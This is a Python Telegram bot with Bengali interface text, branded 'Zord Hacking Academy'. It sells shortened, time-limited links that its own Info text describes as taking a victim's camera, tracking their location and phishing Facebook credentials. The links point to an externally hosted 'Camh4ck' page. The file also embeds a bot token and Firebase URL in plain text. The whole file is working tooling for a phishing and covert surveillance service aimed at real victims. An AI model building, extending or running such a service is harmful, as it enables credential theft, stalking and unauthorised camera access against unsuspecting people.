import telebot
from telebot import types
import requests
import time
from flask import Flask
from threading import Thread
import os

# সেটিংস
BOT_TOKEN = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs"
ADMIN_ID = 7068444019
ADMIN_USERNAME = "bcdatp10" 
CHANNEL_ID = "@hackingacademyX"
FIREBASE_URL = "https://bot-user-deta-default-rtdb.asia-southeast1.firebasedatabase.app/"
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

bot = telebot.TeleBot(BOT_TOKEN)

# --- ফাংশনসমূহ ---
def shorten_link(long_url):
    try:
        res = requests.get(f"http://tinyurl.com/api-create.php?url={long_url}")
        return res.text
    except: return long_url

def get_user(user_id):
    res = requests.get(f"{FIREBASE_URL}/users/{user_id}.json")
    data = res.json()
    if data: return data
    return {"coins": 0, "diamonds": 0}

def save_user(user_id, data):
    requests.patch(f"{FIREBASE_URL}/users/{user_id}.json", json=data)

def get_promo(code):
    res = requests.get(f"{FIREBASE_URL}/promo/{code}.json")
    return res.json()

def is_subscribed(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- রেন্ডার সার্ভার ---
app = Flask('')
@app.route('/')
def home(): return "Zord Academy Bot Online!"
def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
def keep_alive(): Thread(target=run).start()

# --- মেনু বাটন ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 Start", "💰 My Assets")
    markup.row("👥 Refer", "🔥 Access")
    markup.row("ℹ️ Info")
    return markup

@bot.message_handler(commands=['start'])
def welcome(message):
    user_id = message.chat.id
    args = message.text.split()
    
    is_new = requests.get(f"{FIREBASE_URL}/users/{user_id}.json").json() is None
    if is_new:
        if len(args) > 1 and args[1].isdigit():
            ref_id = args[1]
            if str(ref_id) != str(user_id):
                ref_data = get_user(ref_id)
                ref_data['coins'] = ref_data.get('coins', 0) + 50
                save_user(ref_id, ref_data)
                bot.send_message(ref_id, "🎉 কেউ আপনার লিঙ্কে জয়েন করেছে! ৫০ কয়েন পেয়েছেন।")
        save_user(user_id, {"coins": 0, "diamonds": 0})

    if not is_subscribed(user_id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("চ্যানেলে জয়েন করুন", url="https://t.me/hackingacademyX"))
        markup.add(types.InlineKeyboardButton("জয়েন করেছি ✅", callback_data="verify_join"))
        bot.send_message(user_id, "⚠️ বোট ব্যবহার করতে আগে চ্যানেলে জয়েন করুন!", reply_markup=markup)
        return

    bot.send_message(user_id, "👋 স্বাগতম! নিচের মেনু ব্যবহার করুন।", reply_markup=main_menu())

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    user_id = message.chat.id
    text = message.text
    data = get_user(user_id)

    if text == "🚀 Start":
        bot.send_message(user_id, "বোট অ্যাক্টিভ আছে।", reply_markup=main_menu())

    elif text == "💰 My Assets":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛒 কিনুন", url=f"https://t.me/{ADMIN_USERNAME}"),
                   types.InlineKeyboardButton("🎁 রিডিম কোড", callback_data="redeem_ui"))
        msg = f"📊 **আপনার ব্যালেন্স:**\n\n🪙 Coins: {data.get('coins', 0)}\n💎 Diamonds: {data.get('diamonds', 0)}"
        bot.send_message(user_id, msg, reply_markup=markup, parse_mode='Markdown')

    elif text == "👥 Refer":
        bot_user = bot.get_me().username
        link = f"https://t.me/{bot_user}?start={user_id}"
        bot.send_message(user_id, f"🔗 রেফার লিঙ্ক: {link}\n\nপ্রতি জয়েনে ৫০ কয়েন পাবেন!")

    elif text == "🔥 Access":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📸 ক্যামেরা ও লোকেশন (10 Coin)", callback_data="buy_cam"),
                   types.InlineKeyboardButton("🔐 ফেসবুক হ্যাক (1 Diamond)", callback_data="buy_fb"))
        bot.send_message(user_id, "আপনি কিসের অ্যাক্সেস নিতে চান?", reply_markup=markup)

    elif text == "ℹ️ Info":
        info_text = (
            "🤖 **Zord Hacking Academy ইনফো**\n\n"
            "এটি একটি অ্যাডভান্সড হ্যাকিং বোট। নিচে বোটের সব খরচ দেওয়া হলো:\n\n"
            "✅ **কি কি কাজ করা যায়?**\n"
            "- ভিকটিমের ক্যামেরা অ্যাক্সেস নেওয়া।\n"
            "- সঠিক লোকেশন ট্র্যাক করা।\n"
            "- ফেসবুক ফিশিং লিঙ্ক তৈরি করা।\n\n"
            "💰 **খরচ (Cost):**\n"
            "📸 ক্যামেরা + লোকেশন: ১০ কয়েন।\n"
            "🔐 ফেসবুক অ্যাক্সেস: ১ ডায়মন্ড।\n\n"
            "🪙 **কয়েন পাওয়ার উপায়:**\n"
            "- বন্ধুদের রেফার করলে পাবেন ৫০ কয়েন।\n"
            "- অ্যাডমিনের থেকে কিনতে পারবেন।\n\n"
            "💎 **ডায়মন্ড পাওয়ার উপায়:**\n"
            "- ডায়মন্ড শুধুমাত্র অ্যাডমিন দিতে পারে।\n\n"
            "⚠️ **সতর্কতা:** লিঙ্কের মেয়াদ ১ ঘণ্টা থাকবে।"
        )
        bot.send_message(user_id, info_text, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = str(call.message.chat.id)
    data = get_user(user_id)

    if call.data == "verify_join":
        if is_subscribed(user_id):
            bot.delete_message(user_id, call.message.message_id)
            bot.send_message(user_id, "ধন্যবাদ! এখন মেনু ব্যবহার করুন।", reply_markup=main_menu())
        else: bot.answer_callback_query(call.id, "আগে জয়েন করুন!", show_alert=True)

    elif call.data == "redeem_ui":
        msg = bot.send_message(user_id, "রিডিম কোডটি টাইপ করে পাঠান:")
        bot.register_next_step_handler(msg, process_redeem)

    elif call.data == "buy_cam":
        if data.get('coins', 0) >= 10:
            data['coins'] -= 10
            save_user(user_id, data)
            exp = int(time.time()) + 3600
            short_link = shorten_link(f"{BASE_URL}?id={user_id}&exp={exp}")
            bot.send_message(user_id, f"✅ ক্যামেরা ও লোকেশন লিঙ্ক: {short_link}\n(মেয়াদ ১ ঘণ্টা)")
        else: bot.answer_callback_query(call.id, "কয়েন নেই! রেফার করুন।", show_alert=True)

    elif call.data == "buy_fb":
        if data.get('diamonds', 0) >= 1:
            data['diamonds'] -= 1
            save_user(user_id, data)
            exp = int(time.time()) + 3600
            short_link = shorten_link(f"{BASE_URL}fb/?id={user_id}&exp={exp}")
            bot.send_message(user_id, f"✅ ফেসবুক লিঙ্ক: {short_link}\n(মেয়াদ ১ ঘণ্টা)")
        else: bot.answer_callback_query(call.id, "ডায়মন্ড নেই! অ্যাডমিনের থেকে নিন।", show_alert=True)

def process_redeem(message):
    code = message.text
    user_id = str(message.chat.id)
    promo = get_promo(code)
    
    if promo:
        used_by = promo.get('used_by', {})
        limit = promo.get('limit', 1)
        
        if user_id in used_by:
            bot.send_message(user_id, "❌ আপনি এই কোডটি একবার ব্যবহার করেছেন!")
            return
            
        if len(used_by) >= limit:
            bot.send_message(user_id, "😔 দুঃখিত! কোডটির লিমিট শেষ হয়ে গেছে।")
            return

        user_data = get_user(user_id)
        if 'coin_amount' in promo:
            user_data['coins'] += promo['coin_amount']
            txt = f"✅ {promo['coin_amount']} কয়েন যোগ হয়েছে!"
        elif 'diamond_amount' in promo:
            user_data['diamonds'] += promo['diamond_amount']
            txt = f"✅ {promo['diamond_amount']} ডায়মন্ড যোগ হয়েছে!"
        
        save_user(user_id, user_data)
        requests.patch(f"{FIREBASE_URL}/promo/{code}/used_by.json", json={user_id: True})
        bot.send_message(user_id, txt)
    else: bot.send_message(user_id, "❌ ভুল কোড!")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
